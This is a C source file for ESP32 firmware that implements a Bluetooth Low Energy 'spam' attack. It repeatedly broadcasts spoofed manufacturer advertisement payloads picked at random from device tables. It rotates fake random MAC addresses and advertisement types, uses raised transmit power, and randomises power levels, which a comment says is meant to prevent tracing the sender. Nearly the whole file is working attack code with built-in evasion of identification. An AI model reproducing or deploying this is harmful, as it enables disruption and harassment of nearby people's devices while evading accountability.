#include "ble.h"
#include <string.h>
#include "data/devices.h"
#include "data/hid_report_map.h"
#include "esp_random.h"

static const char *tag = "BLE_MODULE";

#define MAX_TX_POWER ESP_PWR_LVL_P9 // increased radius

static esp_ble_adv_params_t adv_params = {
	.adv_int_min = BLE_ADV_INT_MIN,
	.adv_int_max = BLE_ADV_INT_MAX,
	.own_addr_type = BLE_ADDR_TYPE_RANDOM,
	.channel_map = ADV_CHNL_ALL,
	.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

void ble_gap_event_handler(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param)
{
	switch (event)
	{

	case ESP_GAP_BLE_ADV_DATA_SET_COMPLETE_EVT:
		// ESP_LOGI(tag, "Advertising data set successfully.");

		// randomly choose advertisement type
		adv_params.adv_type = (esp_ble_adv_type_t)(esp_random() % 3);

		esp_err_t ret = esp_ble_gap_start_advertising(&adv_params);
		if (ret != ESP_OK)
		{
			ESP_LOGE(tag, "Failed to start advertising: %s", esp_err_to_name(ret));
		}
		break;

	case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
		// ESP_LOGI(tag, "Advertising start complete.");
		break;

	default:
		break;
	}
}

void ble_init(void)
{
	esp_err_t ret;

	ret = nvs_flash_init();
	if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND)
	{
		ESP_ERROR_CHECK(nvs_flash_erase());
		ret = nvs_flash_init();
	}
	ESP_ERROR_CHECK(ret);

	ESP_LOGI(tag, "Initializing Bluetooth Controller...");
	esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
	ret = esp_bt_controller_init(&bt_cfg);
	if (ret)
	{
		ESP_LOGE(tag, "Bluetooth controller initialization failed: %s", esp_err_to_name(ret));
		return;
	}

	ret = esp_bt_controller_enable(ESP_BT_MODE_BLE);
	if (ret)
	{
		ESP_LOGE(tag, "Bluetooth controller enabling failed: %s", esp_err_to_name(ret));
		return;
	}

	ESP_LOGI(tag, "Initializing Bluedroid");
	ret = esp_bluedroid_init();
	if (ret)
	{
		ESP_LOGE(tag, "Bluedroid initialization failed: %s", esp_err_to_name(ret));
		return;
	}

	ret = esp_bluedroid_enable();
	if (ret)
	{
		ESP_LOGE(tag, "Bluedroid enabling failed: %s", esp_err_to_name(ret));
		return;
	}

	ret = esp_ble_gap_set_device_name(BLE_SPAM_DEVICE_NAME);
	if (ret != ESP_OK)
	{
		ESP_LOGE(tag, "Failed to set device name: %s", esp_err_to_name(ret));
	}
	else
	{
		ESP_LOGI(tag, "Device name set to %s.", BLE_SPAM_DEVICE_NAME);
	}

	esp_ble_gap_register_callback(ble_gap_event_handler);
}

void ble_advertise(void)
{
	// 1. Generate a fake random MAC address (first byte set to 0xF0 | random)
	esp_bd_addr_t rand_addr;
	for (int i = 0; i < 6; i++)
	{
		rand_addr[i] = esp_random() & 0xFF;
	}
	rand_addr[0] |= 0xF0;

	// 2. Randomly choose between DEVICES and SHORT_DEVICES
	bool use_long = esp_random() % 2 == 0;

	const uint8_t *chosen_payload;
	size_t payload_len;

	if (use_long)
	{
		int index = esp_random() % (sizeof(DEVICES) / sizeof(DEVICES[0]));
		chosen_payload = DEVICES[index];
		payload_len = 31;
	}
	else
	{
		int index = esp_random() % (sizeof(SHORT_DEVICES) / sizeof(SHORT_DEVICES[0]));
		chosen_payload = SHORT_DEVICES[index];
		payload_len = 23;
	}

	// set advertisement data
	esp_ble_adv_data_t adv_data = {
		.set_scan_rsp = false,
		.include_name = true,
		.include_txpower = false,
		.appearance = 0x00,
		.manufacturer_len = payload_len,
		.p_manufacturer_data = (uint8_t *)chosen_payload,
		.service_data_len = 0,
		.p_service_data = NULL,
		.service_uuid_len = 0,
		.p_service_uuid = NULL,
		.flag = ESP_BLE_ADV_FLAG_GEN_DISC | ESP_BLE_ADV_FLAG_BREDR_NOT_SPT
	};

	// stop advertising if present
	esp_ble_gap_stop_advertising();
	esp_ble_gap_set_rand_addr(rand_addr);
	esp_ble_gap_config_adv_data(&adv_data);

	// randomize transmission power so can't be traced from signal
	int rand_val = esp_random() % 100;
	esp_power_level_t tx_power = MAX_TX_POWER;
	if (rand_val >= 70 && rand_val < 85)
		tx_power = MAX_TX_POWER - 1;
	else if (rand_val < 95)
		tx_power = MAX_TX_POWER - 2;
	else if (rand_val < 99)
		tx_power = MAX_TX_POWER - 3;
	else
		tx_power = MAX_TX_POWER - 4;

	esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, tx_power);
}